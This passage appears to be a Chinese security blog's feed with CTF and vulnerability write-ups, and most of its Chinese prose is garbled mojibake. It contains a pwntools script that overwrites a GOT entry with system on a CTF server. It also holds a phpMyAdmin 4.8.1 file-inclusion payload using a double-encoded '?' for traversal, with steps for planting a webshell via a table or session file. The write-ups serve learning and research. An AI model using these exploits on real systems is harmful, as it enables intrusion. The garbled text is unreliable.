src="/2018/07/18/google-ctf-beginner-part1/20.png"><p>ä¸é”™ï¼Œåœ¨.got.pltéƒ¨åˆ†ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å–åˆ°è¿™ä¸‰ä¸ªå‡½æ•°çš„åœ°å€ï¼Œæ³„éœ²äº†å‡½æ•°åœ°å€ï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥å¾—åˆ°libcçš„ä¿¡æ¯ã€‚</p><p>ä¹‹åè¯¥æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»¬çœ‹åˆ°atoiæ˜¯æ¯æ¬¡æˆ‘ä»¬è¾“å…¥ç¼–å·éƒ½ä¼šè°ƒç”¨çš„å‡½æ•°ï¼Œatoiè€Œä¸”è¿˜åœ¨opençš„é™„è¿‘ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æŠŠatoiè¦†ç›–æˆsystemæ‰§è¡Œæˆ‘ä»¬çš„ä»»æ„å‘½ä»¤ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œã€‚æ‰€ä»¥å‰©ä¸‹çš„å°±ç®€å•äº†ï¼Œæ‰§è¡Œå†™æ“ä½œï¼Œé€šè¿‡ä¹‹å‰æ³„éœ²çš„libcå¾—åˆ°systemçš„åœ°å€ï¼Œè¦†ç›–atoiçš„åœ°å€ã€‚ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack,pack</span><br><span class="line">r = remote(<span class="string">"fridge-todo-list.ctfcompetition.com"</span>,<span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"whz\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"2\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"read?"</span>)</span><br><span class="line">r.send(<span class="string">"-6\n"</span>)</span><br><span class="line">res = r.readuntil(<span class="string">"Hi whz,"</span>).splitlines()[<span class="number">0</span>]</span><br><span class="line">write_addr = res.split(<span class="string">':'</span>,<span class="number">1</span>)[<span class="number">1</span>][<span class="number">1</span>:].ljust(<span class="number">8</span>,chr(<span class="number">0</span>))</span><br><span class="line">write_addr = unpack(<span class="string">"&lt;Q"</span>,write_addr)[<span class="number">0</span>]</span><br><span class="line">base_addr = write_addr<span class="number">-0x910</span></span><br><span class="line">system_addr = base_addr + <span class="number">0x940</span></span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"3\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"entry?"</span>)</span><br><span class="line">r.send(<span class="string">"-4\n"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">8</span>+pack(<span class="string">"&lt;Q"</span>,system_addr)+<span class="string">"\n"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>ä¹‹åæ‰§è¡Œå‘½ä»¤ï¼ŒæŸ¥çœ‹ç”¨æˆ·</p><img src="/2018/07/18/google-ctf-beginner-part1/21.png"><p>å¾—åˆ°ç”¨æˆ·åï¼Œéšåncè¿ä¸Šå»ï¼Œç›´æ¥ç”¨è¯¥ç”¨æˆ·ç™»å½•</p><img src="/2018/07/18/google-ctf-beginner-part1/22.png"><p>å¾—åˆ°flag</p><p>è¿™é‡Œè¦åæ§½ä¸€ç‚¹çš„æ˜¯ï¼Œè¿™ä¸ªæ³„éœ²çš„libcä¸€ç›´æ²¡æ‰¾åˆ°â€¦â€¦ï¼Œæ‰€ä»¥ç›´æ¥å¥—ç”¨çš„å…¶ä»–äººçš„expã€‚ç¬¬ä¸€æ¬¡æ„Ÿè§‰PWNä¹Ÿæ˜¯è›®å‘çš„ã€‚ã€‚ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ä¼šé™†é™†ç»­ç»­çš„æŠŠGoogleCTFé¢˜ç›®çš„ç›¸å…³å¤ç°æ•´ç†å‡ºæ¥ï¼Œè¿™é‡Œå…ˆæ”¾ä¸€éƒ¨åˆ†ã€‚é€šè¿‡è¿™æ¬¡Beginnerè®­ç»ƒè¿˜æ˜¯äº†è§£åˆ°äº†è®¸å¤šä¹‹å‰æ²¡æ¥è§¦è¿‡çš„ï¼Œæ¯”å¦‚PWNé¢˜ä¸­çš„libcåœ°å€é—®é¢˜ã€‚&lt;/p&gt;
&lt;h2 id=&quot;LETTER-MISC&quot;&gt;&lt;a href=&quot;#LETTER-MISC&quot; class
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Google CTF Beginner JS Safe 1 å¤ç°</title>
    <link href="https://hurricane618.me/2018/07/08/google-ctf-beginner-js-safe-1/"/>
    <id>https://hurricane618.me/2018/07/08/google-ctf-beginner-js-safe-1/</id>
    <published>2018-07-08T15:58:48.000Z</published>
    <updated>2018-07-19T01:04:59.440Z</updated>
    
    <content type="html"><![CDATA[<p>å‘¨æœ«çœ‹äº†çœ‹GoogleCTFçš„beginneré¢˜ç›®ï¼Œæ„Ÿè§‰æœ‰äº›é¢˜ç›®è¿˜ä¸é”™ï¼Œè¿™é‡Œå°±å…ˆåˆ†æå…¶ä¸­ä¸€é“é¢˜JS Safeã€‚</p><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><img src="/2018/07/08/google-ctf-beginner-js-safe-1/0.png"><h2 id="åˆ†æä¸æ“ä½œ"><a href="#åˆ†æä¸æ“ä½œ" class="headerlink" title="åˆ†æä¸æ“ä½œ"></a>åˆ†æä¸æ“ä½œ</h2><p>è¿™é“é¢˜æœ‰ç‚¹highï¼Œä½œä¸ºä¸€ä¸ªJSè°ƒè¯•æ–°æ‰‹ï¼Œç€å®çˆ½äº†ä¸€æŠŠã€‚é¢˜ç›®ç»™äº†ä¸€ä¸ªHtmlç½‘é¡µï¼Œé‡Œé¢æœ‰ä¸¤æ®µJSä»£ç ï¼Œçœ‹æ¥æ˜¯JSä»£ç åˆ†æçš„é¢˜ç›®ã€‚</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/1.png"><p>æˆ‘ä»¬å…ˆçœ‹å…¶ä¸­çš„ä¸€æ®µï¼Œå‰ä¸¤ä¸ªæ˜¯è§£å¯†ç”¨çš„å‚æ•°ï¼Œçœ‹åˆ°open_safeè¿™ä¸ªå‡½æ•°ï¼Œpasswordå¿…é¡»æ˜¯CTF{xxxx}çš„æ ¼å¼ï¼Œè¯»å–å…¶ä¸­çš„æ•°æ®ä»£å…¥åˆ¤æ–­ã€‚<br>ifä¸­æŠŠæˆ‘ä»¬çš„è¾“å…¥ä»£å…¥äº†xå‡½æ•°ã€‚</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/2.png"><p>æˆ‘ä»¬çš„passwordä¼šåœ¨envçš„gå‚æ•°ä¸­è¢«ç¼–ç ï¼Œaæ˜¯è¯»æ•°ç»„æ•°æ®ï¼Œbæ˜¯åˆ›å»ºå‡½æ•°ï¼Œcæ˜¯åŠ æ“ä½œï¼Œdæ˜¯asciiç è½¬æ¢ã€‚</p><p>ä¹‹åï¼Œæ ¹æ®codeä¸­çš„å­—æ¯åœ¨envä¸­æ“ä½œå±æ€§ã€‚æœ€åæœ‰ä¸ªç­‰å¾…å€¼æ›´æ–°çš„å¼‚æ­¥æ“ä½œã€‚<br>å…¶ä¸­é‡ç‚¹å°±æ˜¯é‚£ä¸ªforå¾ªç¯å¯¹envçš„æ“ä½œï¼Œä½†æ˜¯ä»£ç è¿™ä¸ªåˆå¾ˆéš¾çœ‹æ‡‚â€¦â€¦ æ‰€ä»¥åªèƒ½ç”¨console.logæ¥dumpå‡ºæ¥çœ‹çœ‹ç»†èŠ‚ã€‚è€Œæˆ‘ä»¬æƒ³çŸ¥é“æˆ‘ä»¬çš„passwordè¢«ç”¨æ¥å¹²ä»€ä¹ˆäº†ã€‚</p><p>åœ¨forå¾ªç¯ä¸­åŠ ä¸Šä¸€äº›ä»£ç æ¥é”å®šgå‚æ•°çš„ä½ç½®ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="regexp">/g/</span>.test(code.substr(i,<span class="number">4</span>)))&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">    <span class="built_in">console</span>.log(env);</span><br><span class="line">    <span class="built_in">console</span>.log(code.substr(i,<span class="number">4</span>));</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2018/07/08/google-ctf-beginner-js-safe-1/3.png"><p>å®šä½åœ¨äº†876å‡ºç°äº†gï¼Œç„¶åçœ‹envé‡Œé¢æœ‰äº›å•¥ã€‚</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/4.png"><p>æœ‰è¶£çš„ä¸œè¥¿ï¼Œå‡ºç°äº†ä¹‹å‰jsä»£ç ä¸­çš„subtleï¼Œdigstï¼Œsha-256ï¼Œè€Œä¸”åœ¨æœ€åçš„æ•°ç»„ä¸­æ˜¯sha-256å’Œæˆ‘ä»¬çš„è¾“å…¥ç¼–ç ï¼Œè¿™å…¶å®å°±å¯ä»¥æ¨æµ‹è¿™é‡Œæ˜¯è¦å¯¹æˆ‘ä»¬çš„è¾“å…¥è®¡ç®—sha-256hashã€‚ä¸ºäº†çœ‹æ›´å¤šç»†èŠ‚ï¼Œæˆ‘ä»¬ç»§ç»­åŠ å…¥ä¸€äº›ä»£ç è°ƒè¯•ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(i&gt;=<span class="number">876</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">    <span class="built_in">console</span>.log(lhs + <span class="string">"="</span> + fn + <span class="string">"("</span> + arg1 + <span class="string">":"</span> +env[arg1] + <span class="string">","</span> + arg2 + <span class="string">":"</span> +env[arg2] + <span class="string">")"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(lhs + <span class="string">"="</span> + env[fn] + <span class="string">"("</span> + env[arg1] + <span class="string">","</span> + env[arg2] + <span class="string">")"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">980</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(env);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹çœ‹è¿™ä¹‹é—´æœ‰ä»€ä¹ˆæ“ä½œ</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/5.png"><p>æœä¸å…¶ç„¶ï¼Œåœ¨876-884ä¸­å®Œæˆäº†å¯¹æˆ‘ä»¬è¾“å…¥çš„hashè®¡ç®—ã€‚</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/6.png"><p>åœ¨940å¤„ï¼ŒæŠŠæˆ‘ä»¬è®¡ç®—å‡ºçš„hashå˜æˆæ•°ç»„ï¼Œå­˜å…¥<code>env[Ñ¾]</code>ä¸­ã€‚</p><img src="/2018/07/08/google-ctf-beginner-js-safe-1/7.png"><p>å¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹åˆ°ï¼Œåœ¨960å–å‡ºäº†æˆ‘ä»¬hashè¿‡åçš„ç¬¬ä¸€ä¸ªå€¼ï¼Œç„¶åä¸230å¼‚æˆ–ï¼Œå¼‚æˆ–åçš„å€¼ä¸hè¿›è¡Œoræ“ä½œåèµ‹å€¼ç»™hï¼Œéšåå¼€å§‹ä¸‹ä¸€æ¬¡å¾ªç¯ã€‚</p><p>ä»ä¹‹å‰çš„jsä»£ç ä¸­çš„ifå°±å¯ä»¥çŸ¥é“hå¿…é¡»ä¸º0æ‰èƒ½è·³è¿‡åˆ¤æ–­ã€‚æ‰€ä»¥å¼‚æˆ–çš„å€¼å¿…é¡»ä¸º0ï¼Œä¹Ÿå°±æ˜¯è¯´å¿…é¡»è¦å’Œå¯¹åº”çš„å€¼ç›¸åŒã€‚è¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸²hashè®¡ç®—åçš„æ•°ç»„ <code>230,104,96,84,111,24,205,187,205,134,179,94,24,181,37,191,252,103,247,114,198,80,206,223,227,255,122,0,38,250,29,238</code></p><p>æœ€ç»ˆæˆ‘ä»¬æŠŠè¿™ä¸²å­—ç¬¦è½¬16è¿›åˆ¶æ‹¼æ¥å¾—åˆ° <code>e66860546f18cdbbcd86b35e18b525bffc67f772c650cedfe3ff7a0026fa1dee</code></p><p>è¿™ä¸ªæ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦çš„hashå€¼ï¼Œæ‰¾ä¸ªhashå€¼ç ´è§£ç½‘ç«™ï¼Œå¾—åˆ° Passw0rd! ï¼Œæ‰€ä»¥æœ€ç»ˆflagä¸º<code>CTF{Passw0rd!}</code></p><p>è‡³äºå‰©ä¸‹çš„ä»£ç ï¼Œå®ƒæ˜¯ç”¨äºè§£å¯†æ•°æ®çš„ï¼Œæˆ‘ä»¬è¾“å…¥æ­£ç¡®å°±ä¼šè§£å¯†æˆåŠŸï¼Œè¾“å‡ºæ˜¯ä¸‹ä¸€é¢˜çš„å…¥å£ã€‚æ„Ÿè§‰æ˜¯ä¸€é“é¢˜è¢«æ‹†åˆ†æˆäº†å‡ å—â€¦â€¦</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä¸€é“æ¯”è¾ƒåŸºç¡€ä½†æ˜¯åˆå¾ˆè€ƒå¯ŸåŸºæœ¬åŠŸçš„é¢˜ï¼Œä»ä¸­å­¦ä¹ åˆ°äº†å¾ˆå¤šã€‚</p><p>æœ€åæˆ‘æƒ³è¯´ä¸€ä¸‹çš„æ˜¯é‚£ä¸ªSubtleCrypto.digest()æ–¹æ³•æˆ‘ä¸€å¼€å§‹æ²¡æ€ä¹ˆææ‡‚ï¼Œä»–æ˜¯æ€ä¹ˆæŠŠutf-8çš„ç¼–ç æ•°ç»„hashè®¡ç®—çš„ã€‚ä¹‹åæ‰¾åˆ°äº†å®ƒçš„å®ç°åŸç†ï¼Œæ‰€ä»¥ä¹Ÿå°±æ‡‚äº†ï¼Œä¸ºä»€ä¹ˆè¦ä¸€å¼€å§‹å…ˆutf-8ç¼–ç æ‰è¿›è¡Œhashè®¡ç®—ã€‚</p><p><code>https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/digest</code></p><p>ç»è¿‡è¿™æ¬¡JSåˆ†æï¼Œæ„Ÿè§‰å­¦ä¹ ä¸“é—¨çš„JSè°ƒè¯•è¿«åœ¨çœ‰ç«â€¦â€¦ ï¼Œæœ‰å˜é‡ç›‘å¬å’Œäº‹ä»¶ç›‘å¬ï¼Œä¼šç»™è°ƒè¯•å·¥ä½œå¸¦æ¥å¾ˆå¤§ä¾¿åˆ©ã€‚</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BOAKGP/CTF-Writeups/tree/master/Google%20CTF%202018%20Quals%20Beginners%20Quest/JS%20safe</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;å‘¨æœ«çœ‹äº†çœ‹GoogleCTFçš„beginneré¢˜ç›®ï¼Œæ„Ÿè§‰æœ‰äº›é¢˜ç›®è¿˜ä¸é”™ï¼Œè¿™é‡Œå°±å…ˆåˆ†æå…¶ä¸­ä¸€é“é¢˜JS Safeã€‚&lt;/p&gt;
&lt;h2 id=&quot;é¢˜ç›®&quot;&gt;&lt;a href=&quot;#é¢˜ç›®&quot; class=&quot;headerlink&quot; title=&quot;é¢˜ç›®&quot;&gt;&lt;/a&gt;é¢˜ç›®&lt;/h2&gt;&lt;img src=&quot;
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>phpmyadmin4.8.1 åå°LFI</title>
    <link href="https://hurricane618.me/2018/07/01/phpmyadmin4-8-1-background-LFI/"/>
    <id>https://hurricane618.me/2018/07/01/phpmyadmin4-8-1-background-LFI/</id>
    <published>2018-07-01T13:02:15.000Z</published>
    <updated>2018-08-14T16:34:49.115Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰ChaMd5å›¢é˜ŸæŠ¥å‡ºæ¥çš„phpmyadminçš„æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä»Šå¤©å°±æ¥åˆ†æå¤ç°ä¸€ä¸‹ã€‚</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/1.png"><p>æ¼æ´çš„è¾“å…¥ç‚¹æ˜¯ <code>include $_REQUEST[&#39;target&#39;];</code>å‡ºç°äº†æ–‡ä»¶åŒ…å«è¿™ç§å±é™©æ“ä½œï¼Œé‚£ä¹ˆæœ‰å¾ˆå¤§æ¦‚ç‡å‡ºç°é—®é¢˜ã€‚</p><p>æˆ‘ä»¬åªè¦ç»•è¿‡57ã€58ã€59è¡Œçš„æ£€æµ‹å°±å¯ä»¥æˆåŠŸæ§åˆ¶åŒ…å«æ–‡ä»¶ã€‚</p><p>ç¬¬57è¡Œç”¨æ­£åˆ™åŒ¹é…å¼€å¤´ä¸ºindexçš„è·¯å¾„ï¼Œåªè¦è·¯å¾„å¼€å¤´æ²¡æœ‰indexå³å¯ã€‚</p><p>ç¬¬58è¡Œæ£€ç´¢è¾“å…¥ä¸­æ˜¯å¦æœ‰é»‘åå•çš„å­—ç¬¦ï¼Œé»‘åå•åœ¨ç¬¬50è¡Œï¼Œå¯ä»¥çœ‹åˆ° import.phpå’Œexport.phpï¼Œåªè¦å‚æ•°ä¸­æ²¡è¿™ä¸¤ä¸ªphpå°±è¡Œã€‚</p><p>ç¬¬59è¡Œè¦çœ‹Coreç±»çš„æ–¹æ³•checkPageValidityã€‚</p><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/2.png"><p>ç¬¬452è¡Œçš„ç¬¬ä¸‰ä¸ªifåˆ¤æ–­ï¼Œæ£€æŸ¥äº†è¾“å…¥ä¸­çš„ç™½åå•ï¼Œå¦‚æœæœ‰è¿™äº›phpå°±ç›´æ¥è¿”å›trueã€‚</p><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/3.png"><p>æ²¡ä»€ä¹ˆç”¨ï¼Œç»§ç»­çœ‹ä¸‹é¢çš„æ“ä½œã€‚mb_substræˆªå–å­—ç¬¦ä¸²ä»å¼€å§‹çš„ä½ç½®åˆ°?å¤„çš„å­—ç¬¦ä¸²ï¼Œå†æ¬¡æ£€ç´¢ç™½åå•ã€‚</p><p>è™½ç„¶å¯ä»¥åœ¨urlä¸­åŠ å…¥?æ¥é€šè¿‡è¿™ä¸ªåˆ¤æ–­ï¼Œä½†æ˜¯éšåçš„includeå› ä¸ºæœ‰?ï¼Œæ‰€ä»¥å°±æ— æ³•åŒ…å«æˆ‘ä»¬æ§åˆ¶çš„æ–‡ä»¶ã€‚</p><p>ä¹‹åï¼Œé‡ç‚¹æ¥äº†ï¼Œåœ¨465è¡Œå‡ºç°äº†ä¸€ä¸ªurlè§£ç æ“ä½œã€‚ç”±äºè¿™é‡Œè§£ç ä¹‹ååˆé‡å¤äº†ä¸€éä¸Šé¢çš„æˆªå–æ“ä½œï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥è®©?ç¼–ç ä¸¤æ¬¡æ¥ç»•è¿‡ç™½åå•æ£€æµ‹ï¼Œä¹‹åè¿”å›åˆ°includeçš„æ—¶å€™ä¹Ÿèƒ½åŒ…å«æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶ã€‚æœ€åçš„payloadå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../tongfang.txt</span><br></pre></td></tr></table></figure><p>db_sql.phpæ˜¯ç™½åå•ä¸­çš„ä¸€ä¸ªï¼Œç„¶åç”¨ä¸¤æ¬¡URlç¼–ç è¿‡çš„?æˆªæ–­ï¼Œä¸¤æ¬¡URLç¼–ç çš„?åœ¨phpçš„urldecodeåä¼šå˜æˆ?ï¼Œä»è€Œç»•è¿‡æ£€æµ‹ï¼Œä¹‹åincludeæ–‡ä»¶æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè®¤ä¸ºdb_sql.php%3fæ˜¯ä¸€ä¸ªç›®å½•ï¼Œç„¶ååŒ…å«æœ€åçš„æ–‡ä»¶ã€‚</p><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/4.png"><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><ol><li>åˆ©ç”¨åˆ›å»ºæ–°çš„è¡¨ï¼Œåœ¨è¡¨çš„å­—æ®µä¸­æ”¾å…¥Webshellï¼Œç„¶ååŒ…å«æ•°æ®åº“æ–‡ä»¶</li><li>æ‰§è¡Œ<code>SELECT &#39;&lt;?php phpinfo(); ?&gt;&#39;</code>,ç„¶ååŒ…å«phpçš„sessionæ–‡ä»¶</li></ol><p>æ¨èç”¨ç¬¬äºŒç§æ–¹æ³•æ›´åŠ éšè”½å¹¶ä¸”ä¸éœ€è¦çŒœæµ‹æ•°æ®åº“æ–‡ä»¶è·¯å¾„ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p><img src="/2018/07/01/phpmyadmin4-8-1-background-LFI/5.png"><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ€»çš„æ¥è¯´è¿™ä¸ªæ¼æ´éœ€è¦åœ¨ç™»å½•phpmyadminä¹‹åæ‰èƒ½åˆ©ç”¨ï¼Œæ‰€ä»¥åªè¦å¯†ç å¼ºåº¦å¤Ÿï¼Œæš‚æ—¶å°±ä¸ä¼šæœ‰å¤ªå¤§å±é™©ï¼Œä½†è¿˜æ˜¯æ¨èå°½å¿«å‡çº§ã€‚å¦å¤–å¦‚æœæ˜¯åœ¨sessionä¸­å†™äº†Webshellï¼Œç”¨èœåˆ€è¿çš„æ—¶å€™å¿…é¡»è¦æœ‰phpmyadminçš„sessionæ‰è¡Œâ€¦â€¦</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=23&amp;srcid=0701Pk3Qg7hDrUSsZWD5dffq#rd" target="_blank" rel="noopener">ChaMd5çš„æ–‡ç« </a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ä¹‹å‰ChaMd5å›¢é˜ŸæŠ¥å‡ºæ¥çš„phpmyadminçš„æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä»Šå¤©å°±æ¥åˆ†æå¤ç°ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;h2 id=&quot;åˆ†æ&quot;&gt;&lt;a href=&quot;#åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;åˆ†æ&quot;&gt;&lt;/a&gt;åˆ†æ&lt;/h2&gt;&lt;img src=&quot;/2018/07/01/
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="https://hurricane618.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="https://hurricane618.me/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CSPç»•è¿‡æ€»ç»“</title>
    <link href="https://hurricane618.me/2018/06/30/csp-bypass-summary/"/>
    <id>https://hurricane618.me/2018/06/30/csp-bypass-summary/</id>
    <published>2018-06-30T03:33:01.000Z</published>
    <updated>2018-08-14T16:35:26.391Z</updated>
    
    <content type="html"><![CDATA[<p>é¦–å‘åœ¨ä¿¡å®‰ä¹‹è·¯ä¸Š <a href="https://mp.weixin.qq.com/s/z_XmhrTUg_yUfkyAFFfaKQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/z_XmhrTUg_yUfkyAFFfaKQ</a> ï¼Œä¹‹åæ–‡ç« ç•¥æœ‰ä¿®æ”¹ã€‚</p><h1 id="CSPç»•è¿‡æ€»ç»“"><a href="#CSPç»•è¿‡æ€»ç»“" class="headerlink" title="CSPç»•è¿‡æ€»ç»“"></a>CSPç»•è¿‡æ€»ç»“</h1><p>ä»Šå¹´çš„0CTFé¢„é€‰èµ›6é“webé¢˜ï¼Œå…¶ä¸­ä¸‰é“éƒ½æ¶‰åŠCSPçš„çŸ¥è¯†ç‚¹ï¼Œç®€ç›´å¯æ€•ã€‚ã€‚ã€‚è¿™æ¬¡è¶ç€ç©ºé—²æ—¶é—´å°±ç¨ç¨æ€»ç»“ä¸€ä¸‹CSPç»•è¿‡æ–¹é¢çš„çŸ¥è¯†ï¼Œæ— è®ºæ˜¯å¯¹ä»¥åCTFæ¯”èµ›è¿˜æ˜¯å·¥ä½œéƒ½å¾ˆæœ‰å¸®åŠ©ã€‚</p><h2 id="CSPçš„åŸºç¡€"><a href="#CSPçš„åŸºç¡€" class="headerlink" title="CSPçš„åŸºç¡€"></a>CSPçš„åŸºç¡€</h2><p>CSPçš„å…¨ç§°Content Security Policyï¼Œç”¨æ¥é˜²å¾¡XSSæ”»å‡»çš„æŠ€æœ¯ã€‚å®ƒæ˜¯ä¸€ç§ç”±å¼€å‘è€…å®šä¹‰çš„å®‰å…¨æ€§æ”¿ç­–æ€§ç”³æ˜ï¼Œé€šè¿‡CSPæŒ‡å®šå¯ä¿¡çš„å†…å®¹æ¥æºï¼Œè®©WEBå¤„äºä¸€ä¸ªå®‰å…¨çš„è¿è¡Œç¯å¢ƒä¸­ã€‚</p><p>ä¸€ä¸ªCSPå¤´ç”±å¤šç»„CSPç­–ç•¥ç»„æˆï¼Œä¸­é—´ç”±åˆ†å·åˆ†éš”,å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self' www.baidu.com; script-src 'unsafe-inline'</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æ¯ä¸€ç»„ç­–ç•¥åŒ…å«ä¸€ä¸ªç­–ç•¥æŒ‡ä»¤å’Œä¸€ä¸ªå†…å®¹æºåˆ—è¡¨ã€‚ç­–ç•¥æŒ‡ä»¤æœ‰å¦‚ä¸‹é€‰é¡¹ï¼š</p><table><thead><tr><th>æŒ‡ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>default-src</td><td>å®šä¹‰èµ„æºé»˜è®¤åŠ è½½ç­–ç•¥</td></tr><tr><td>connect-src</td><td>å®šä¹‰ Ajaxã€WebSocket ç­‰åŠ è½½ç­–ç•¥</td></tr><tr><td>font-src</td><td>å®šä¹‰ Font åŠ è½½ç­–ç•¥</td></tr><tr><td>frame-src</td><td>å®šä¹‰ Frame åŠ è½½ç­–ç•¥</td></tr><tr><td>img-src</td><td>å®šä¹‰å›¾ç‰‡åŠ è½½ç­–ç•¥</td></tr><tr><td>media-src</td><td>å®šä¹‰ \&lt;audio>ã€\&lt;video> ç­‰å¼•ç”¨èµ„æºåŠ è½½ç­–ç•¥</td></tr><tr><td>object-src</td><td>å®šä¹‰ \&lt;applet>ã€\&lt;embed>ã€\&lt;object> ç­‰å¼•ç”¨èµ„æºåŠ è½½ç­–ç•¥</td></tr><tr><td>script-src</td><td>å®šä¹‰ JS åŠ è½½ç­–ç•¥</td></tr><tr><td>style-src</td><td>å®šä¹‰ CSS åŠ è½½ç­–ç•¥</td></tr><tr><td>sandbox</td><td>å€¼ä¸º 